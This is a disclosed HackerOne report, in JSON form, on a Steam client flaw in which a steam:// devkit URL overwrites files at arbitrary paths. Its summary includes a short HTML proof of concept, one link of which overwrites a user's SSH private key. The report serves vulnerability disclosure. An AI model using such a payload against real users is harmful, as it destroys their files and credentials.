{"id":667242,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC82NjcyNDI=","url":"https://hackerone.com/reports/667242","title":"[steam client] Opening a specific steam:// url overwrites files at an arbitrary location","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2019-08-04T21:24:19.731Z","submitted_at":"2019-08-04T21:24:19.731Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"kbeckmann","url":"/kbeckmann","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/063/948/e64cb44a81518d1cb14f48de27af5fa01d9c5c37_original.jpg/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":23363,"url":"https://hackerone.com/valve","handle":"valve","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/023/363/c78d46a7d0ea39e3a15a7c19c1a48634f2571eb9_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/023/363/c78d46a7d0ea39e3a15a7c19c1a48634f2571eb9_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Valve","twitter_handle":"","website":"https://www.valvesoftware.com","about":""}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"no-content","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2020-09-22T18:48:14.138Z","bug_reporter_agreed_on_going_public_at":"2020-09-21T15:17:41.155Z","team_member_agreed_on_going_public_at":"2020-09-22T18:48:13.899Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"","bounty_amount":"750.0","formatted_bounty":"$750","weakness":{"id":6,"name":"Write-what-where Condition"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":null,"vote_count":78,"voters":["nightshiba","yssk","njbooher","xploiterr","mzfr","gamer7112","foobar7","mvc","discodamone","excavator","and 68 more..."],"severity":{"rating":"medium","score":5.3,"author_type":"Team","metrics":{"attack_vector":"network","attack_complexity":"high","privileges_required":"none","user_interaction":"required","scope":"unchanged","confidentiality":"none","integrity":"high","availability":"none"}},"structured_scope":{"databaseId":1285,"asset_type":"DOWNLOADABLE_EXECUTABLES","asset_identifier":"steam.exe","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":5498615,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"","automated_response":false,"created_at":"2019-08-04T21:27:05.991Z","updated_at":"2019-08-04T21:27:05.991Z","actor":{"username":"kbeckmann","cleared":false,"url":"/kbeckmann","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/063/948/e64cb44a81518d1cb14f48de27af5fa01d9c5c37_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"valve","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5510762,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"","automated_response":false,"created_at":"2019-08-06T11:07:33.528Z","updated_at":"2019-08-06T11:07:33.528Z","actor":{"username":"ktistai","cleared":false,"url":"/ktistai","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/322/520/01cd21dce301646646276fd9125cffd448fbffd6_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"valve","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5510905,"is_internal":false,"editable":false,"type":"Activities::BugNeedsMoreInfo","message":"","automated_response":false,"created_at":"2019-08-06T11:40:59.426Z","updated_at":"2019-08-06T11:40:59.426Z","actor":{"username":"ktistai","cleared":false,"url":"/ktistai","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/322/520/01cd21dce301646646276fd9125cffd448fbffd6_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"valve","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5510965,"is_internal":false,"editable":false,"type":"Activities::BugNew","message":"","automated_response":false,"created_at":"2019-08-06T11:53:55.924Z","updated_at":"2019-08-06T11:53:55.924Z","actor":{"username":"kbeckmann","cleared":false,"url":"/kbeckmann","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/063/948/e64cb44a81518d1cb14f48de27af5fa01d9c5c37_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"valve","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5518368,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","automated_response":false,"created_at":"2019-08-07T09:42:23.735Z","updated_at":"2019-08-07T09:42:23.735Z","actor":{"username":"ktistai","cleared":false,"url":"/ktistai","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/322/520/01cd21dce301646646276fd9125cffd448fbffd6_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"valve","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5518377,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","automated_response":false,"created_at":"2019-08-07T09:45:05.144Z","updated_at":"2019-08-07T09:45:05.144Z","additional_data":{},"actor":{"username":"ktistai","cleared":false,"url":"/ktistai","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/322/520/01cd21dce301646646276fd9125cffd448fbffd6_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"valve","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5838443,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"","automated_response":false,"created_at":"2019-09-18T18:41:02.764Z","updated_at":"2019-09-18T18:41:02.764Z","actor":{"username":"kbeckmann","cleared":false,"url":"/kbeckmann","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/063/948/e64cb44a81518d1cb14f48de27af5fa01d9c5c37_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"valve","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7918569,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","automated_response":false,"created_at":"2020-05-06T23:34:40.918Z","updated_at":"2020-05-06T23:34:40.918Z","actor":{"username":"jonp","cleared":false,"url":"/jonp","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/203/578/6de63d2fdd8c70309cf4326359d3e816a7633b5c_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"kbeckmann","url":"/kbeckmann"},"genius_execution_id":null,"team_handle":"valve","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7918570,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","automated_response":false,"created_at":"2020-05-06T23:34:50.270Z","updated_at":"2020-05-06T23:34:50.270Z","actor":{"url":"/valve","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/023/363/c78d46a7d0ea39e3a15a7c19c1a48634f2571eb9_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Valve"}},"bounty_amount":"750.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"valve","collaborator":{"username":"kbeckmann","url":"/kbeckmann"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9279269,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2020-09-21T15:17:41.255Z","updated_at":"2020-09-21T15:17:41.255Z","first_to_agree":true,"actor":{"username":"kbeckmann","cleared":false,"url":"/kbeckmann","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/063/948/e64cb44a81518d1cb14f48de27af5fa01d9c5c37_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"valve","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9298184,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2020-09-22T18:48:13.962Z","updated_at":"2020-09-22T18:48:13.962Z","actor":{"username":"mikela","cleared":false,"url":"/mikela","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"valve","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9298185,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2020-09-22T18:48:14.166Z","updated_at":"2020-09-22T18:48:14.166Z","actor":{"username":"mikela","cleared":false,"url":"/mikela","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"valve","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"id":24562,"category":"team","content":"If a user opens `steam://devkit-1/list-shortcuts?response=/tmp/testfile`, a file `/tmp/testfile` will be created containing the response to this request. Another problem with this is that the file will be *overwritten* if it already exists.\n\nThe owner of the file will be the same as the user that runs the steam client. This also means that we can overwrite and wipe out files that the user cares about, e.g. ssh keys, documents etc as long as we know the full path to those files.\n\nPOC: (the URL may also be visited with an iframe and thus doesn't require any user interaction)\n```\n\u003chtml\u003e\n\u003chead\u003e\n  \u003ctitle\u003eSteam client POC\u003c/title\u003e\n\u003c/head\u003e\n\n\u003cbody\u003e\n    \u003ca href=\"steam://devkit-1/list-shortcuts?response=/tmp/testfile\"\u003eCreate /tmp/testfile\u003c/a\u003e\n    \u003ca href=\"steam://devkit-1/list-shortcuts?response=/home/ubuntu/.ssh/id_rsa\"\u003eOverwrite /home/ubuntu/.ssh/id_rsa\u003c/a\u003e\n\u003c/body\u003e\n\u003c/html\u003e\n```\n\n## Impact\n\nAn attacker can overwrite and wipe out files at an arbitrary location, as long as the steam client is executed with a user that can write to those files.\n\nA user's SSH keys, documents etc may be deleted as long as the attacker knows the full path to those files.\n","can_view?":true,"can_create?":false,"attachments":[],"user":{"id":279011,"username":"mikela","name":"Mike L","bio":"","cleared":false,"website":null,"location":"","created_at":"2018-05-17T22:06:50.780Z","url":"https://hackerone.com/mikela","anc_triager":false,"hackerone_triager":false,"hackerone_employee":null,"user_type":"company","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png","medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png","xtralarge":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"}}},{"category":"researcher","can_view?":true,"can_create?":false}]}